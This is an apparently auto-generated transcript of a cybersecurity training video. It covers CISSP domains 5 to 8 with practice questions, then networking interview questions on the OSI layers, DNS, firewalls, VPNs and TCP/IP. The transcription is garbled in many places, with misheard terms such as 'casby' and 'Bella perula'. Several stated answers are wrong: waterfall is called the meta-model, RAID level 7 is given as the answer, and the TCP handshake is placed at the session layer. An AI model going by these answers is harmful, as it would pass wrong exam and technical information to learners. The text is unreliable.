sense of how you're going to allow
people to access the resources that you
have in your organization let's look at
what this domain covers it will talk
about physical and logical access to
assets so servers need to be protected
by putting them in a secure server room
that's just restricting access to them
and allowing access only to those few
people who require access to them once
we have secured those servers this is
where we talk about physical security
whereas we got a secure room we're going
to monitor that room we will have access
controls we will have guards monitoring
who is getting access or who's trying to
get access to that environment and then
you're going to create logical access as
well where we let's say have swipe cards
on the door locks so anyone with logical
swipe card can access that particular
facility you're also looking at managing
identification and authentication of
people devices and services so here we
are going to talk about authentication
mechanisms single authentication
multi-factor authentication we are
talking about single sign-ons we will
talk about Federated in identity
management modules we'll look at casby
or Cloud access service Brokers we'll
talk about session management from
applications and so on so forth but we
will also talk about third party
identity as a service provider where we
integrate those those identities like
open ID into our organization and we
validate People based on the identity
that they have created with those
organizations then we talk about access
control list which would be role-based
access controls mandatory access
controls discretionary access controls
attribute base access controls rule
based access controls and then there are
a lot of theoretical models that are
integrated in this module which talk
about lattice based approach which we'll
talk about other theoretical models
which will help you align how identity
and access management is implemented in
an organization so at this point in time
we will also be looking at a life cycle
of how identities are managed for
example onboarding of people debording
of people termination of employees
employees as they move within the
organization by getting promotions
demotions or changing departments and
assuming a new role so here we talk
about how we can provision an identity
how we can deprovision an identity how
it is to be managed we're going to
create a relationship between the
creator of this identity and the
approver who is going to be a manager so
even if somebody is allowed to create an
identity they will only create it if
they have an approval from an
appropriate manager so let's look at
questions from domain number five the
first one which of the following is the
most important factor while selecting a
biometric system for securing critical
assets now you have the domain talks
about the types of authentication
mechanisms there are five types
essentially three basic types which talk
about something that you know which is a
password something that you have a swipe
card someone that you are a biometric
somewhere that you are location based
and something that you do like captcha
so these are the five basic
authentication types or mechanisms that
you can utilize in an organization
multi-factor authentication is having
multiple of these options in integrated
in our identity and access management
module to enhance the security now
coming back to Biometrics Biometrics
have positives and negatives amongst
them so with the biometric there are two
types that we talk about false rates of
false acceptance rate and false
rejection rate what is the false
acceptance rate uh somebody let's say
you're using a thumbprint to
authenticate people somebody put down
their thumb print the person is not
actually authorized however it was read
incorrectly and the dough got unlocked
and the person got access to that
particular area which is a false
acceptance rate a false rejection rate
is an author authenticated or an
authorized person actually trying their
thumbprint but it's not getting
recognized thus they did not get access
to the area or to the device that they
wanted now the question here is which of
the following is the most important
factor while selecting a biometric
system for securing critical Assets Now
would I want to focus on false rejection
rate or false acceptance rate then we
also have equal error rate and maximum
allowable downtime maximum a lovable
downtime is if the biometric measure
fails and if nobody is getting access to
any of the resources to what level or to
what extent would my business be able to
tolerate such an outage here the uh
correct answer is the false acceptance
rate because if an unauthorized person
gets access to my devices that's the
worst case scenario if the biometric
system is down and nobody's getting
access that may still be acceptable
rather than having an unauthorized
person getting access to very sensitive
data false rejection rate is also
detrimental to the organization however
it is not as bad as having a false
acceptance rate introduced in the
organization the second question which
are the two major factors to measure
biometric performance again the question
from the previous one far false
acceptance rate and frr false rejection
rate or FSE and err ier and far frndic
they don't actually relate so the
correct answer here is far false
acceptance rate and false rejection rate
so these are the two major factors false
rejection rate may still be a little bit
acceptable but a false acceptance rate
is not tolerable at all next question a
commercial application for steganography
that is used to identify documents or
verify their authenticity is either a
digital checksum an md5 Hash a digital
signature or a watermark now here the
keywords matter we are talking about
steganography so suddenly people start
thinking about hiding data within data
and then if you just isolate the words
identify documents or verify the
authenticity we basically directly go to
a digital signature because that's what
we utilize for an entrepudiation however
what the question refers to is an
application for stigonography
steganography is hiding some element
which would be visible only to known
people we can utilize technography on
for to benefit our ourselves or our
organization by using it to identify the
authenticity of a document so if I am
going to print out a document maybe a
watermark on the document which is not
visible to the naked eye but when I want
to validate the document I would search
for that particular Watermark and that
is the correct answer for this
particular question so that's what
domain 5 is all about all right let's
look at domain number six which is
security assessment and testing now this
domain is all about assessments auditing
strategies and testing so from this
domain what we're going to take away is
talking about internal audits external
audits third party audits in the
security control testing strategizing
about how we Implement a vulnerability
management system a program within the
organization that is reputable
consistent and measurable can be tied up
with other management programs like
patch management Incident Management and
anything and everything that requires a
vulnerability assessment like even
change management if some thing is going
to change in an organization you can
have a vulnerability assessment done
before you want to even think about
allowing it or disallowing that change
similarly with penetration testing to
validate the vulnerabilities that you
have identified log reviews having Siam
tool that will help you analyze or
create a patent analysis of what's
happening within their infrastructure
what's happening within the organization
from a security perspective that you're
talking about collecting security
process data account management when you
say account management identity and
access management life cycle so
onboarding of an employee off-boarding
of an employee the lateral movements of
an employee in an organization when
they're getting promoted or they are
transferred in from one Department to
another right so all of these would come
under security assessment and testing to
see how those policies are functioning
to analyze the effectiveness of those
policies thus the requirement for
conducting vulnerability assessment and
penetration tests so let's look at a few
questions on this domain and let's start
off with the first one which of the
following ways requires the involvement
of an information security analyst so
out of these four options a systems
requirements definition system design
program development or program testing
during which phase would you involve a
security analyst now for this we first
need to identify why we require a
security analyst what is the job
requirement what is the activity that is
going to be conducted by a security
analyst right so in this scenario the
correct answer is program testing in the
program development phase we won't need
an analyst we would need a program
manager and
architects who can develop a particular
program who can give it some semblance
of what needs to be achieved in the
system design it would be again an
architect who's going to develop that
system and the system's requirements
definition again so in the systems
requirements definition it's a
requirement Gathering about what is what
you need to adhere to what is is going
to be the Baseline that you're going to
create so from these four options you
need to identify where would you place a
security analyst right in the exam it's
the most probable answer that you're
looking for it's not the most idealistic
answer right so from these four options
security analysts would most likely be
involved in the program testing phase
rather than any other phase the second
question which of the following
techniques is generally not used for
monitoring purposes now when you say
monitoring what is monitoring monitoring
is looking into logs activities anything
and everything that has already happened
so you are reacting to something that
has already happened and which of these
following techniques is not used for
monitoring so you're collecting logs
you're analyzing those logs what would
be not be utilized a penetration test
intuition detection violation processing
or countermeasures testing right now
when you're monitoring you would monitor
a penetration test to analyze if the
test was successful or not into
detection that's the first input that
you look at for analysis violation
processing anything is violated any
processes any policies you analyze them
and you you monitor them thus you come
to know that this has happened in
countermeasures testing there's
basically a test of the effectiveness of
the countermeasures that are already
implemented at that point in time you
may not be monitoring these the software
program that acts on behalf of user in
their absence to carry out operations is
known as an agent worm applet or a
browser so a program that acts on behalf
of a user in their absence to carry out
operations is either an agent an applet
or a verb or a browser a browser is
nothing but a software that allows you
to surf the Internet a worm is a
malicious application that would be more
of a nuisance value than anything else
and applet is something that allows you
into connectivity an agent is something
that will that can be automated used for
automated tasks and can run those tasks
in the absence of a particular user so
if you look at these questions
understanding what each and every word
means understanding and highlighting the
keywords in the question itself and then
analyzing the scenario that you're
placed in and then identifying the most
appropriate answer for that particular
question that is how you want to
approach a cisp exam looking at the next
domain domain number seven and that
security operations let's look at what
security operations has for us now in
security operations you're looking at
looking at a sock a security Operation
Center so your regular version
management Incident Management problem
management change management facing
controls analyzing all that information
so probably having an SIM tool
configuring the Sim tool collecting all
those data so identifying event sources
what are event sources when I have an
Siem implemented I am not going to
expect the Siem to automatically start
collecting data all by itself and then
again I don't expect the Sim tool to
understand what kind of data it needs to
collect so for me in a security
Operation Center after I have installed
an Siam tool I first need to configure
it to identify which devices I want to
monitor from which devices I want to
collect that information and where do I
want to store it once I have all that
information in place after that I'm
going to analyze that data to identify
if anything is been incorrectly going on
or is there any security incident that
has happened and those would be raised
at incidences and that would be sent to
the soft team for analysis and then an
incident response right similarly
intrusion detection and prevention logs
would be utilized to identify something
that may have been missed by the IDS IPS
itself you're going to place controls
for investigations like administrative
controls which would be policies that
you have made then you've got criminal
laws or some if something bad has
happened that can be described as a
crime based on the law of that land how
how you're going to deal with it civil
laws regular regulatory laws and
Industry standards regulatory raws would
be for example gdpr in the European
Union right a civil law would be where
there is no criminal activity that has
happened but let's say there's a breach
of contract between two organizations
and the civil lawsuit has been filed
against our Organization for a breach of
service level agreements regulatory
would be the gdpr ACT where you have to
report to a regulatory body and if there
are any flaws you could be fined
industry standards ISO 27001 PCI DSS and
so on so forth so when you're looking at
these requirements for investigation all
of these would have prescribed how
you're going to handle that
investigation if it is a criminal
investigation an organization by itself
doesn't have the right to investigate
they have to go to a law enforcement
agency and there is a procedure to
follow in case of a civil lawsuit there
are lawyers who would deal with this uh
this kind of activity send out notices
to the other party then go to a code of
of law to file a lawsuit over there in
gdpr there are timelines on how you're
going to report a breach or how you're
going to report an incident and so on so
forth so in the security operations
you're creating a security Operation
Center in alignment with all of these
five requirements you're going to look
at logging and monitoring activities
having that Sim tool which will identify
those devices that you want to monitor
collect relevant information that is
prescribed based on all those five
investigation types that we just
discussed then you're looking at when
you're looking at identification of
assets you go back to your asset
inventory asset register you look at all
the assets that you have and then you
make your strategy and plan how you want
to collect those logs right and then
this module will deal about how do you
want to handle identity and access
management privilege account management
service level agreements and so on so
forth so this basically is the day to
day-to-day business activity of an
organization from a security perspective
so you are there to identify incidents
as a CIS you won't be executing this but
you would be creating policies revolving
all of these aspects so yeah this is
what you need to consider this is what
you need to strategize upon and this is
what you want to advise the organization
to what needs to be in place to be more
effective from a security perspective
let's look at the few questions from
this domain how does the subject get
access to an object in a multi-level
security policy now first we need to
understand what a multi-level security
policy is we need to understand what a
subject is and what an object is let's
look at the options first the subject
sensitivity label must dominate the
object sensitivity label the subject
sensitivity label subordinates the
object sensitivity sensitivity label the
subject sensitivity label the
subordinate whether object sensitivity
label and to repeat the sensitivity tags
again and again the subject sensitivity
label is dominated with object
sensitivity label too much sensitivity
in a single slide however you can see
that this just confuses the version of
what they are trying to read and not
only you missing what keywords are so
people normally focus on a keyword
called multi-level security policy and
start getting confused in that with
while we do disregard what a subject and
an object is right so a subject and an
object is a relationship that is created
between identity and access management
subject being the user object being the
resource that needs to be accessed by
that particular user after which comes a
multi-level security policy which is
basically the access control Matrix that
you have created between these multiple
objects and multiple subjects so for
example in this domain you would also
talk about theoretical models for access
management including lattice based
approach weather sensitivity labels come
into the picture you would talk about
clock Wilson model you will talk about
Bella perula model and a few other
models right all of them theoretically
in nature which can then based on other
orientations be implemented in a
real-time scenario so all that
understanding comes in the picture and
then you need to identify how those
sensitivity labels in a lattice based
approach could allow you to create those
labels for your subjects and objects and
then the identity and access management
tool would become the verification
Factor where it identifies the labels
for the subject and the object and based
on those labels they allow artists allow
connectivity or allow connections to
happen now here the correct answer is
that the subject sensitivity label must
dominate the object's sensitivity label
so the user should have a sensitivity
label that allows them access to the
object which has an equivalent
sensitivity label so understanding those
models becomes very much important not
only from an exams perspective but when
you're creating a policy you basically
are going to use these terminologies and
you're going to create a policy around
this moving on the second question
managers of which department are ideal
for the development of information
security policy for an organization
business operation Information
Technology purchase or human resources
now managers of which department are
ideal for development of information
security policy for an organization and
when we say information security policy
we would obviously assume that is the IT
department is going to deal with it and
it's the information technology in this
uh in this case but that's incorrect it
is the business operation why because
right from the first domain so we would
be taught in the training for cissp that
security needs to enhance the business
functionality not the other way around
so we are in the business or we are in
the function of conducting a business
which would offer services and those
services that are being offered the
business activity that has been
conducted should be supplemented by
security so those business activities
could be conducted in a secure manner at
no point in time is going is security
going to be a deterrent to business the
only reason for us anything to become a
deterrent to business is the legality of
it if a business is illegal it will not
happen or it should not happen however
if the business activity is legal then
security should not stop that activity
from happening security should be
implemented in such a way that it is the
business activity is strengthened there
is security embedded within it secure by
Design and then the business activity
goes on so even if you're a chief
information security officer or a
security manager and you go and talk
with the the board of directors or the
steering committee as the terms you will
come across in this training uh you will
understand that it is it's these people
who would Define how the business is
going to work what kind of business
activity you're going to do and then you
provide the example and I'll give you an
example here let's say I'm an online
retailer and I want to sell good goods
online which is legal I'm selling online
good Goods now I want security to our
team to come in and they would help me
to secure the the function of being an
online e-tailer if you will my security
team is not going to come and tell me of
not to do go into that business or stop
some Services because they may be
insecure right the security team's
requirement is that if I want to sell
goods online they need to now create an
architecture of devices of clouds or
whatever is required to make it secure
so thus the managers of business
operations will always be the ideal
department for the development of
information security policies they
decide what is what the business is
going to happen and then the security
team just complements it by adding the
security to it for example just going on
with this a website is launched with
HTTP the security team comes into the
picture and says data in motion means
security so we're going to convert it
into https and at no point in time are
they going to say HTTP is vulnerable so
we are not going to do this we rather
become a wholesale shop or something
like that and I'm just giving an example
and rather than me just rambling on
let's move on to the next question
question three installing malicious
software on the system to allow future
backdoor access leads to violation of
what is integrity does it violate the
data Integrity system user or network
now malicious software on a system to
allow future backdoor access so what are
we doing here we are basically
installing a software or an application
on a particular system which allows a
hacker a backdoor access to the system
so this would violate the Integrity of
the system itself right the data would
be compromised but the data would be
compromised because the system work got
compromised a user doesn't matter
because a back door is a back door entry
where you can get access without even
logging in as a user and a network is
just a way of communication at this
point in time but since being that
system got infected and through that
infection you got access to whatever was
on that particular system now that's
domain number seven domain number eight
which is the last domain in the cissp
exam is software development security
sdlc or ssdlc secure software
development life cycle right that's what
is discussed in this domain let's go
back to the cisp guide and see what this
domain would consist of so software
development security now you can see
software development life cycles coming
in so they are going to talk about
different life cycles like waterfall
model they're going to talk about agile
they're going to talk about modified
waterfall this module also will talk
about uh devsecops devops and anything
and everything that would be there with
the software development life cycle now
when we say software development life
cycle the essence of assist is to add
another s to the sdlc the sdlc stands
for software development life cycle this
is adds one more is the secure software
development life cycle
so as with everything secure by Design
which means security needs to be
integrated at every phase of the life
cycle and not should it should not be
bolted on for example a waterfall model
talks about how the software is going to
be developed and how it is going to be
published or released at the end of the
life cycle at no point in time does it
talk about security thus security arcade
at that point will die at that point in
time would come into the picture and
decide what are the requirements of the
software what uh what are the security
vulnerabilities or the risk that they
see so threat modeling would happen and
all those things need to be introduced
right from the Inception so if there are
developers or if there is a business
requirement for an application let's go
back to the previous example I'm an
e-tailer so to become an etail and not
do I only need a website I will need a
web application for that function it
will be given out so I need to develop
that application in a regular lifecycle
model I developed that application and
then go into security where I do a vapt
on that application find out that there
are disastrous results and then I go
back and start coding again which is not
a good scenario so I have hired assist
who will then come into the picture
during the sdlc and the Inception itself
when businessmen are talking about uh
how the business is going to happen at
that point in time the CIS will come in
and start with a threat modeling
exercise saying you know what let's talk
about what are the risks this
application is going to face you're
going to handle a lot of payment
information because people need to pay
for the products right so credit cards
you're going to be going to be involved
there's a database or SQL injection
attacks so these are the threads that
we're looking at and now threat modeling
exercise would be followed by a risk
assessment then would be looked at Upon
A by an impact analysis and then based
on that you will prioritize those risks
you will then educate your developers to
use secure coding practices at the same
time security testing would be done to
see how the application is being evolved
and then by the time that the software
development life cycle comes to an end
you would have a secure software which
had security by Design integrated since
the Inception rather than having bolted
on now this is the ideal scenario that
you're looking for the expense and the
budgeting that's where the balance of of
capital uh Investments and time to
Market and all that comments comes into
the picture but for the training we will
always be in an ideal scenario we'll
always have enough time enough resources
monetary and human and the exam
basically looks at a very ideal scenario
in which you got just about everything
you just need to make the correct
decision at no point in time are you
going to think that if I start doing a
particular strategy it is going to cost
me a lot of money so I don't want to do
that that's the real world scenario in
the real world you look at the cost you
look at the timelines deadlines and then
you take a informed decision of how much
you want to invest in what in the ideal
world for the cisp exam or the cissp
exam there are no limitations you are
looking at the most correct way of doing
those things and thus you are you
identify those requirements and that's
how you answer the exam so you're
looking at the security software
environments that you require
configuration management auditing and
logging of changes security impact of
acquired software now in this scenario
we talked about developing a software
what if I purchase a third-party
software and I introduce it into my
organization now this software when
integrated how is it going to impact my
current security controls uh impact my
current identity access management my
networking my other applications my
communications so that's something that
you want to assess as well right so
let's go for the questions question one
in which of the following raid level the
drive array continues to operate even if
any disks fails now in the actual exam
they're not going to be very technical
it's a manageable exam so they may not
ask you these kind of questions but the
knowledge is still required so you need
to know that there is something called
raid the different levels of read uh
because you might want to use that as a
solution in a particular thing how do
you want to implement rate and all of
those that's not the knowledge that we
want but in this scenario rate level 7
is the ideal answer question two which
of the following steps can be utilized
or can be used to protect an
organization against the failure of a
critical software firm now basically
what does this talk about this talks
about Disaster Recovery or this this
talks about business continuity for
example there's a failure of some sort
when there is something that fails what
does it do it interrupts the business so
the moment a business Interruption
happens what should kick in the business
continuity plan if the business
continuity plan fails then the disaster
recovery plan kicks in so if you look
into it as we go in we might even come
against uh terminologies like rtos rpos
return time objective and Recovery Point
objective and at that point in time you
want to look at how do we want to
recover from a data loss and thus you
will come across Solutions now of the
four options full backups differential
backups and incremental backups and the
fourth one software SQL agreement what
is the difference between these now full
backup is a complete backup of the
entire data that you have taken now it
sounds easy but in an organization data
could be terabytes petabytes and to do a
complete backup my take days weeks or a
lot of time right it's not just copying
one megabyte from a hard disk to a USB
drive and be done with the backup so
full backups may be possible but not on
a regular basis so maybe you do a full
backup every week which means that at
the end of the week if the data loss
happens then you have lost the data for
an entire week because the backup was
last week the as it's not a very good
solution and to complement that we could
use incremental backups and differential
backups right so the training would
include all of these definitions of what
these backups are what happens and then
the fourth option software SQL agreement
what is that now in a software
development or a software life cycle if
I purchased a software from a third
party my biggest risk is not of me
getting hacked on the app the software
getting hacked from a business
continuity the biggest risk is if the
software provider goes bankrupt or is
taken over by somebody else or stops
supporting the software then what what
am I to do because I may have invested
millions of dollars or reinvesting into
a different product and migrating to a
different product would be expensive
very costly and be very time consuming
so what do I do at that point in time so
there is an option for software escrow
agreement what does that mean that the
source code of that software is placed
in an escrow which means let's say uh in
a bank where the bank will hold the soft
the source code in a secure Manner and
the source code cannot be accessed or be
modified either by the developing
organization or the purchasing
organization so it just sits with the
bank if the developers go out of
business or they stop supporting at that
point in time the escrow can be opened
and the purchaser that that's us in this
case can still get the source code so
now we can develop the software or we
can go into the source code analyze and
save ourselves from a disaster right so
these are the four options now here
you're talking about a critical software
firm that failed you're not talking
about data that field so the correct
answer here is the software escrow
agreement right question number three
now here we come across the world
development models which one of these is
a meta model that incorporates several
other software development models are we
looking at waterfall modified waterfall
spiral or critical patch but here the
correct answer is a waterfall model so
we are going to look at 10 different
questions on networking then we'll have
10 more questions on software and
programming another 20 questions on
operating systems and applications 10
questions on cyber attacks and then the
finally 10 questions on cryptography so
we're going to discuss over 50 odd
questions each in these different fields
which will help you crack your
interviews as well as cyber security is
concerned let's start off with
networking questions let's start off
with question one what is the OSI model
explain the different layers of the OSI
model OSI largely is a theoretical model
utilized to understand networking and
how data packets are created and how
they are being processed by a computer
this is normally used by the tcpip the
transmission control protocol over
Internet Protocol software suite
so OSI is known as the open systems
interconnection model it is a reference
model that describes how applications
are going to interact via the computer
network
there are seven different layers that we
need to understand they are as follows
so in this diagram there are these seven
different layers we start off from the
bottom first is the physical layer the
data link layer Network layer transport
layer session layer presentation and
application
then such a question is asked in an
interview it is not only that we
identify these seven layers explaining
what the OSI model is in the first place
we then try to identify these seven
layers and we give a brief description
about each and every layer if there are
any additional questions they will come
after uh this basic question
so let's start off with the physical
layer this is the lowest layer of the
OSI model now this is where any and
every physicality of your computer comes
into the picture so it could be an uh
network interface card it could be an
RJ45 or a CAT5 cable anything that
allows data to be transmitted physically
from your machine to another machine
next comes the data link layer
so on the data link layer as far as
networking is concerned we just need to
understand that data packet is encoded
decoded into bits at this layer this is
also the layer that deals with Mac
addressing so the physical address of
every network interface card which is
the MAC address which is utilized to
Route data package over the network this
is where the MAC address resides on the
data link layer
the next layer is the network layer here
datagrams are transferred from one to
another the function of this layer
routing and logical addressing the
moment we talk about a routing and
logical addressing IP addresses come
into the picture IP version 4 IP version
6. so Network layer will deal with IP
addressing and the routing of those
packets then comes the transport layer
this is the layer responsible for
end-to-end connections that
automatically signifies that this is
where TCP and UDP will be working
TCP stands for transmission control
protocol UDP for user datagram protocol
TCP
is a connection oriented protocol
whereas UDP is a connectionless protocol
these two Protocols are utilized to
establish connectivity between two
machines TCP is a more reliable method
of connectivity because there are a lot
of packets that are sent across to
verify that the data has been sent data
has been received and so on so forth
whereas UDP is a connectionless protocol
medata is just dumped without verifying
whether the receiver actually receives
that data or not
so in a nutshell on the transport layer
TCP and UDP make their appearance and
this is where that functionality lies
then comes the session layer this
controls signals between the computer it
establish maintains and terminates
connections between processes so in the
transport layer we talked about TCP and
UDP UDP being a connection less protocol
where data is just transmitted without
verifying whether the receiver received
that data or not whereas TCP we studied
is more of a reliable protocol thus
there are different packets signals that
will be sent across to verify that data
has been transmitted it has been
received properly and then the next uh
segment of that data is being sent so
those control signals are established
using the session layer so the three-way
handshake of TCP the acknowledgment
packets and
those kind of packets will be taken
taken care of on the session layer of
the OSI model
then comes the presentation layer the
presentation layer is responsible to
translate data into the application
layer format so the formatting right
mine or encoding that is being utilized
the utf-8 character set that we utilize
for presentation encryption mechanisms
all of these work on the presentation
layer
and finally comes the application layer
where the application itself uses a
particular protocol
so that the other machine on the
receiving end the application on that
machine would be able to understand what
the communication was about
right so in a nutshell
if I start from up top the application
layer will deal with any of the data
that the application
is generating so maybe an user input
you're logging in you're typing a
username password all that data will be
constructed let's say to an HTTP or
https format that's where your
application layer comes into picture
then the formatting of which into utf-8
and the encryption of which would be
done at the presentation layer then this
transport layer and the session layer
would kick in to establish a TCP session
do the three-way handshake establish
that connectivity IP addressing would be
done on the network layer Mac addressing
would be done on the data link layer and
when everything is ready on the physical
layer the packet will be sent out at the
receiving end the packet will be
received on the physical layer and then
all these layers will be reversed and
finally at the application layer the
data would be presented to the
application who would then execute it
and showcase it on the screen of the
recipient
so this is the way you want to explain
this question you want to be very
concise precise about what you're
explaining you don't want to go into two
hypothetical scenarios you don't want to
delete earlier with the layers you just
want to give the basic functionality you
want to demonstrate that you understand
what the OSI layer is how the computer
functions and you want to move on from
there if the interviewer has any further
follow-up questions they will ask those
specific questions
so that's question one moving on to the
question two
question two is Define unicasting
multicasting and broadcasting
now this is a question which can be very
lengthy but again most of your interview
questions are designed that way it's
basically to understand how much
conceptually you are aware about these
Technologies so you have to be very
concise don't go uh rattling about
technology too much
but in a concise manner just try to
explain what these things is so when
data is being transmitted over a network
it can be transmitted either in one of
these particular manners it can either
be a unicast multicast or a broadcast so
what is unicast
unicast is when a message is sent from a
single user to a single ratio so one to
one right so uh one machine talking to
another machine and nobody else so also
known as point-to-point Communications
1.1 the point if you have to send
information to multiple receivers then
you will have to send it using multicast
right so this is where your multicast
networking comes into picture so in our
case let's assume it's a network where
there are there's a Class C Network
approximately 255 odd machines and
Within These there are two machines that
want to talk to each other
if they want to talk between each other
it would be a point-to-point
communication where they will utilize
unicast where only these two machines
will have visibility of that
conversation and the other machines will
not even realize that this conversation
is taking place
if one machine wants to talk to multiple
machines then the multicast comes into
the picture as the name suggests in this
mode of communication data is sent from
one or more or more sources to multiple
destinations multicast uses the internet
group management protocol also known as
the igmp protocol to identify groups so
under this igmp protocol various groups
are created where machines are
subscribed to those particular groups
and whenever a message needs to be sent
through those groups
it will be identified by the igmp
protocol and then that particular
message will be sent to those multiple
machines that are members of those
particular groups
and then comes the broadcast the third
method is known as the broadcast as it
says it is going to broadcast to all so
this is one to all that is communication
between a single user and it is going to
be sent to all the machines in that
particular Network
right so the theory is unicast is one
two one
multicast is one to many
and broadcast is one to all and then
question number three
what is DNS DNS stands for domain name
system it is like the internet's phone
book that is responsible for mapping the
domain name
into its corresponding IP address and
let me give you an example over here
wherever we go and open up let's say a
browser a Google Chrome browser we type
in
www.google.com and then we press enter
and magically Google comes in front of
us the website rather
now how does the computer know who
Google is because as far as we are
concerned humans understand Google and
words like that computers don't
computers deal with binary zeros and
ones right and as far as Internet is
concerned they will only deal with IP
addresses and Mac addresses so how does
a computer know how to find google.com
and where is it located so the moment we
type in in the browser window in the
address bar google.com and press enter a
DNS query is generated automatically by
the browser where a packet is sent to
our DNS servers asking what the IP
address is so in short DNS resolves
domain names to their corresponding IP
addresses there is a DNS server which
will have this index a database of all
the domains associated with their IP
addresses if one particular DNS server
does not have that information that
you're looking for it may query another
DNS server who may have that particular
response so the first thing is when you
type in domain name it gets resolved
with the DNS it identifies the IP
address corresponding to that particular
domain name and thus allows the computer
to route that packet to the particular
server where that domain name resides
so in this scenario if you look at the
screen on the local PC you have typed in
cybersecurity.com there's a DNS
resolution that a query that goes to the
DNS server what is the IP of
cybersecurity.com the DNS server looks
it up in its particular database if it
has the corresponding IP address it will
then respond back the IP address is
172.17.252.1 after which the packet is
sent off to cybersecurity.com moving on
to question number four what is a
firewall
now this is a very good question and
normally a very basic answer that I've
ever heard is that a firewall is a
hardware and a software firewall but
that's the functionality of a firewall
that is what how you can install a
firewall but there are different types
of firewalls and there is a specific
functionality that the firewall is
created for right so firewall is either
a hardware or software
but its responsibility is for blocking
either incoming or outgoing traffic
from the internet to your computer they
secure a network so essentially the
firewall will allow a connection to
happen or this allow a connection to
happen it won't go beyond that that's
the basic functionality of a firewall
okay so based on the configurations that
you have done based on the rules that
you have created on the firewall it will
then based on those rules identify
whether some traffic is allowed in that
Network or some traffic is to be blocked
from entering that Network so as the
screen shows
the firewall rules will analyze whether
the traffic is good
if yes it will allow if the traffic is
bad it will block the traffic and not
allow that connection from happening in
the first place now there are a few
common types of firewalls that also need
to be included in the answer to this
question and the first one is a packet
filtering firewall these are the most
common types that you will come across
which analyze packets and less than pass
through only if they match and establish
security rule set now here people do get
confused when we say that we analyze
packets people think that these
firewalls will analyze the contents of
that packet which is not correct
weather definition for a packet
filtering firewall says that these
firewalls analyze packets it means that
they are only analyzing the source and
destination IP addresses port numbers
and the protocols that are mentioned in
those packets these firewalls do not
have the capability of deep packet
inspection or a DPI as it is known if
that capability comes into the picture
you're basically looking at an intrusion
detection system or inclusion prevention
system in today's world called as a
next-gen firewall okay so a packet
filtering firewall essentially will only
analyze data package for its source and
destination IP addresses port numbers
and the protocol that is being utilized
it will then map that information to the
rules that are there on the firewall and
based on those rules it will either
allow that a collection to happen or
disallow that connection from happening
the second type of is a proxy firewall
these firewalls filter Network traffic
at the application Level So when you say
application Level they work at the layer
7 of The OSI model package filtering
firewalls since we have mentioned that
did work on IP addressing and port
numbers will work on the network layer
of the OSI model also on the transporter
because we also look at protocols proxy
firewalls will work at layer 7 which is
this application layer of the OSI model
and will deal with application Level
protocols such as HTTP https FTP SMTP
and so on so forth
and the third one is a stateful
multilarity inspection firewall these
filter packets are the network transport
and application layers so they basically
do the job of the first and the second
type of firewalls
the packets are compared to loan trusted
packets but now the first question is if
there is a stateful multi-layer
inspection firewall why do we have type
1 and type 2 firewalls like packet
filtering and proxy firewalls that is
because that is how the firewalls have
evolved we started off with a packet
filtering then we added functionality to
it and so on so forth so if a question
comes what is a firewall you start off
with the
option saying it is a hardware or
software this is the responsibility the
functionality of a firewall is to allow
good traffic and disallow bad traffic
based on the rules that have been
configured on the firewall and then
you've got basically three types of
firewalls packet filtering proxy and
stateful multi layer and just include a
brief description of each of these
firewalls if getting your learning
started is half the battle what if you
could do that for free visit scale up by
simply learn click on the link in the
description to know more
then moving on to question number five
what is a VPN
VPN is also called a virtual private
Network it is a connection between a VPN
server and a VPN client
so it basically creates a encrypted
tunnel between the client and the VPN
server which is then utilized to secure
the connections that you are making with
the internet so as you can see in the
diagram
the user has a VPN client installed on
their machine the VPN client then
creates an encrypted tunnel to the VPN
server
and through this tunnel encrypted data
is transmitted which can then be
processed by the VPN server uh sent to
the internet information can receive be
can be received backed by the VPN server
the VPN server will encrypt the data
back and send it back to the user so if
there's a man in the middle attack that
is happening or a hacker trying to
eavesdrop on the communication mechanism
they will not be able to do so because
of the encrypted tunnel it is very
difficult to decrypt this or hack
through this encrypted tunnel it it is
possible but it is very difficult to
achieve that moving on to question
number six what are the advantages of
distributed processing now before we go
into advantages of distributed
processing we first have to understand
what is distributed processing
so it is a term which describes various
computer systems that use more than one
processor to run an application
here multiple computers across different
locations share the same processor the
advantages of Distributing processes are
as follows but before we go into the
advantages distributed computing is
basically where multiple machines will
pool their resources together to run a
singular application so an application
that has multiple resources and can
scale up and scale down as and when
required the advantages are that it can
be very very useful in data recovery
for example read where your striping
data on various hard disks it is
reliable it is cheaper lower cost can be
achieved and it is easy to expand
because of the scalability factor that
we just talked about if there is loss of
data in one computer it can then be
recovered by another interconnected
computer and one of the examples would
be blockchain in today's world right
what is blockchain that this data is
created live and stored on a connection
of computer so if one of the computers
goes offline the other computers in that
network will still have that data and
there the blockchain will still function
without any issues the second point a
glitch in one machine does not affect
the processing as there will be multiple
other machines like we discussed in the
blockchain several cost effective mini
computers are used instead of costly or
Mainframe machine so instead of having a
server bank I can have multiple machines
connect interconnected together and they
can function in that particular
blockchain or for that particular
distributed processing mechanic is it
depending on the amount of data
processing more computers can be
attached to the network thus you can
increase the number of computers that
can be a part of that blockchain or you
can reduce them as and when necessary
moving on to question number seven what
is tcpip
tcpip or transmission control protocol
over Internet Protocol is a set of
communication protocols that are used to
interconnect networking devices on the
internet this protocol defines how data
should be transmitted over the Internet
by providing end-to-end Communications
so essentially if you want networking to
be established on your machine you will
need tcpid
without TCP there will be no work groups
there will be no domains basically your
interconnectivity will go for a toss
tcpip is a software that once installed
on your machine will then interact with
the hardware which is your network
interface cards and then your switches
wires cables and all those through
protocols that have been already
pre-configured in it So within the TCP
Suite of softwares you will have all the
protocols all the functionality of the
OSI layer
and each and every protocol that works
on each and every layer will be
predefined and pre-configured to work in
a particular manner the Internet
Protocol is all about routing each
individual packet to make sure it
reaches its destination so with the TCP
you are talking about the protocols that
will allow you to format the data and
generate it so that you can communicate
it over the network the IP will then
deal with the routing of those packets
so that the packet can be routed to the
correct computer and be received by the
recipient
so a TCP model is the compressed version
of The OSI the seven layers will get
converted into four layers the network
access layer internet layer transport
layer and application layer going on to
question 8
what do you mean by ipconfig and if
config both of these are commands the
first one on a Windows machine the
second one on a Linux machine
so ipconfig is known as the Internet
Protocol configuration this is a command
that is used on the command line
interface of Microsoft Windows to view
all the adapters and the configuration
of each and every adapters for their
network interfaces so as you can see on
the right hand side in the command
prompt screen if once you type in the IP
config command on the C prompt and press
enter it will give you a list of all the
adapters that are there
so you can see wireless LAN adapter
local area connection the media is
disconnected it doesn't exist at the
bottom you'll see the Wi-Fi connection
wireless LAN adapter and can give you
the IP version 6 IP address IP version 4
address the subnet mask and the default
gateway so this is the configuration
that allows the machine to know on what
network it is on what is the default
gateway for communicating to the
internet what is the subnet mask so how
